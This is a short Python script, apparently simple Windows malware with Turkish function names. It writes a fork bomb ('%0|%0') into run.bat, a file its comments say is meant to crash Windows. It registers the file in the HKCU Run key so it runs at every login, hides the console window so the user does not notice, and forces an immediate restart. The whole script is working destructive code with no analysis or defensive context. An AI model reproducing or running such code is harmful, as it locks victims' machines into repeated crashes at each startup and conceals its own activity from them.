import os
from winreg import *
import win32console
import win32gui

def bat_baslangic_ekle(): #add bat file to startup
    fp = os.path.dirname(os.path.realpath(__file__)) #get current path
    file_name="run.bat"
    new_file_path = fp +"\\"+file_name
    keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    SetValueEx(key2change, "XxXxX", 0, REG_SZ, new_file_path) #add run.bat file to startup with register key

def bat_olustur():
    virus = open("run.bat", "w") #create a bat file
    virus.write("%0|%0") #write %0|%0 that is our cmd code to crash windows
    print("BAT DOSYASİ OLUSTURULDU")

def cmd_gizle():
    window=win32console.GetConsoleWindow() #we must hide to cmd
    win32gui.ShowWindow(window,0) #user mustn't know that cmd is running
    return True

def win_restart():
    os.system("shutdown /r /t 1") #restart windows in a second


bat_olustur()
bat_baslangic_ekle()
cmd_gizle()
win_restart()

